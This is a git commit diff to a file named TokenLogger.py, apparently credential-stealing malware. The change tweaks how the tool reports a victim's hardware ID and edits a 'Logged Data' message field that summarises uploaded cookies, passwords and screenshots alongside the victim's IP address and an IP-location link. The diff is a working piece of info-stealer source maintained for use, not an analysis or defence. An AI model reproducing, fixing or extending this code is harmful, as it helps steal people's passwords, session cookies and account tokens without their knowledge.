f05581b2741e02e73c791ba2f8fc1b37a2dbb7fc
Local <76016636+LocalsGitHub@users.noreply.github.com>
2021-07-26 11:13:28 -0700

    Update TokenLogger.py

--- TokenLogger.py
+++ TokenLogger.py
@@ -332,7 +332,7 @@ class Logger():
                 locationOfIP = "https://whatismyipaddress.com/ip/" + ip
                 reg = Reg()
                 path = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001'
-                hwid = str(reg.read_value(path, 'HwProfileGuid')).split("'")[7]
+                #hwid = str(reg.read_value(path, 'HwProfileGuid')).split("'")[7] not working
                 getColor = [0x1abc9c, 0x11806a, 0x2ecc71, 0x1f8b4c, 0x3498db, 0x206694, 0x9b59b6, 0x71368a, 0xe91e63, 0xad1457, 0xf1c40f, 0xc27c0e, 0xe67e22, 0xa84300, 0xe74c3c, 0x992d22, 0x95a5a6, 0x607d8b, 0x979c9f, 0x546e7a, 0x7289da, 0x99aab5]
                 randomColor = random.choice(getColor)
                 embed = {
@@ -355,7 +355,7 @@ class Logger():
                         },
                         {
                             "name": "**Logged Data**",
-                            "value":  f"{cookiesUploaded} | {passwordsUploaded} | {screenshotUploaded}\n\nHwids:\n {gethwid()}\n{hwid}",
+                            "value":  f"{cookiesUploaded} | {passwordsUploaded} | {screenshotUploaded}\n\nHwid:\n {gethwid()}",
                             "inline": False
                         },
                     ],
